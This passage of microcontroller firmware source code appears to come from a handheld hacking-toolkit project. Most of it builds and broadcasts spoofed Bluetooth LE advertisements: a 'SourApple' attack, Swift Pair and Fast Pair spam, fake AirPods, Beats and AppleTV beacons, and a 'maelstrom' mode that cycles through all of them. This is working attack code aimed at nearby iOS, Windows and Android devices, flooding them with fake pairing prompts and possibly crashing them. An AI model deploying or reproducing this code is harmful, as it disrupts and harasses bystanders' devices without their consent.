  { "AppleTV New User", 20},
  { "AppleTV AppleID", 21},
  { "AppleTV Audio", 22},
  { "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},
  { "AppleTV Network", 25},
  { TXT_AJ_TV_COLOR, 26},
  { TXT_STP_NW_PH, 28},
};
int ajmenu_size = sizeof(ajmenu) / sizeof (MENU);

void aj_setup(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 0);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(" AppleJuice  ");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  drawmenu(ajmenu, ajmenu_size);
}

void aj_loop(){
  if (!maelstrom){
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ajmenu_size;
      drawmenu(ajmenu, ajmenu_size);
      delay(100);
    }
  }
  if (check_select_press() || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) {
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        data = AppleVisionPro;
        break;
      case 30:
        rstOverride = false;
        isSwitching = true;
        current_proc = 10;
        break;
    }
    if (current_proc == 11 && isSwitching == false){
      DISP.fillScreen(BGCOLOR);
      DISP.setTextSize(MEDIUM_TEXT);
      DISP.setCursor(0, 0);
      DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.println(" AppleJuice  ");
      DISP.setTextColor(FGCOLOR, BGCOLOR);
      DISP.setTextSize(SMALL_TEXT);
      DISP.print(TXT_ADV);
      DISP.print(ajmenu[cursor].name);
      DISP.print(TXT_SEL_EXIT2);
      isSwitching = true;
      current_proc = 12; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

void aj_adv_setup(){
  rstOverride = false;  
}

void aj_adv(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || androidPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print(TXT_SA_ADV);
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(std::string((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf(TXT_SP_ADV, display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(std::string((char *)packet, size));
      free(packet);
      free((void*)display_name);
    } else if (androidPair) {
      Serial.print(TXT_AD_SPAM_ADV);
      uint8_t packet[14];
      uint8_t i = 0;
      packet[i++] = 3;  // Packet Length
      packet[i++] = 0x03; // AD Type (Service UUID List)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      packet[i++] = 6; // Size
      packet[i++] = 0x16; // AD Type (Service Data)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      packet[i++] = (model >> 0x10) & 0xFF;
      packet[i++] = (model >> 0x08) & 0xFF;
      packet[i++] = (model >> 0x00) & 0xFF;
      packet[i++] = 2; // Size
      packet[i++] = 0x0A; // AD Type (Tx Power Level)
      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

      oAdvertisementData.addData(std::string((char *)packet, 14));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else {
      Serial.print(TXT_AJ_ADV);
      if (deviceType >= 18){
        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
    #if defined(M5LED)
        digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
        delay(10);
        digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
    #endif
  }
  if (check_next_press()) {
    if (sourApple || swiftPair || androidPair || maelstrom){
      isSwitching = true;
      current_proc = 10;
      drawmenu(btmenu, btmenu_size);
    } else {
      isSwitching = true;
      current_proc = 11;      
      drawmenu(ajmenu, ajmenu_size);
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

void btmaelstrom_setup(){
  rstOverride = false;
  maelstrom = true;
}

void btmaelstrom_loop(){
  swiftPair = false;
  sourApple = true;
  aj_adv();
  if (maelstrom){
    swiftPair = true;
    androidPair = false;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = true;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = false;
    sourApple = false;
    aj_loop(); // roll a random device ID
    aj_adv();
  }
}

void bootScreen(){
  // Boot Screen
  #ifdef SONG
  setupSongs();
  #endif
  DISP.fillScreen(BGCOLOR);
  // DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(40, 0);
  DISP.setTextDatum(MC_DATUM);
  DISP.drawString("Turtly", (int)(DISP.width()/2), (int)(DISP.height()/2), BIG_TEXT);
  DISP.setTextDatum(TL_DATUM);
  DISP.setCursor(10, 30);
  DISP.setTextSize(SMALL_TEXT);
  #if defined(CARDPUTER)
    // DISP.println(TXT_INST_NXT);
    // DISP.println(TXT_INST_PRV);
    // DISP.println(TXT_INST_SEL);
    // DISP.println(TXT_INST_HOME);
    // delay(1500);
    // DISP.println(TXT_INST_PRSS_KEY);
    // while(true){
    //   M5Cardputer.update();
    //   if (M5Cardputer.Keyboard.isChange()) {
    //     drawmenu(mmenu, mmenu_size);
    //     delay(250);
    //     break;
    //   }
    // }
  #else
    // DISP.println(TXT_STK_NXT);
    // DISP.println(TXT_STK_SEL);
    // DISP.println(TXT_STK_HOME);
    delay(3000);
  #endif
}

void loop() {
  // This is the code to handle running the main loops
  // Background processes
  switcher_button_proc();
  screen_dim_proc();
  check_menu_press();
  
  // Switcher
  if (isSwitching) {
    isSwitching = false;
    Serial.printf("Switching To Task: %d\n", current_proc);
    switch (current_proc) {
      case 1:
        mmenu_setup();
        break;
      case 2:
        smenu_setup();
        break;
      case 3:
        credits_setup();
        break;
      case 4:
        qrmenu_setup();
        break;
      #if defined(AXP) || defined(PWRMGMT)
        case 5:
          battery_setup();
          break;
      #endif
      #if defined(CARDPUTER)
        case 5:
          battery_setup();
          break;
      #endif
      #if defined(ROTATION)
        case 6:
          rmenu_setup();
          break;
      #endif
      case 7:
        utmenu_setup();
        break;
      #if defined(RTC)
        case 8:
          clock_setup();
          break;
      #endif
      case 9:
        emenu_setup();
        break;
      case 10:
        btmenu_setup();
        break;
      case 11:
        aj_setup();
        break;
      case 12:
        aj_adv_setup();
        break;
      case 13:
        btmaelstrom_setup();
        break;
    }
  }

  switch (current_proc) {
    case 1:
      mmenu_loop();
      break;
    case 2:
      smenu_loop();
      break;
    case 3:
      credits_loop();
      break;
    case 4:
      qrmenu_loop();
      break;
    #if defined(AXP) || defined(PWRMGMT)
      case 5:
        battery_loop();
        break;
    #endif
    #if defined(CARDPUTER)
      case 5:
        battery_loop();
        break;
    #endif
    #if defined(ROTATION)
      case 6:
        rmenu_loop();
        break;
    #endif
    case 7:
      utmenu_loop();
      break;
    #if defined(RTC)
      case 8:
        clock_loop();
        break;
    #endif
    case 9:
      emenu_loop();
      break;
    case 10:
      btmenu_loop();
      break;
    case 11:
      aj_loop();
      break;
    case 12:
      aj_adv();
      break;
    case 13:
      btmaelstrom_loop();
      break;
  }
}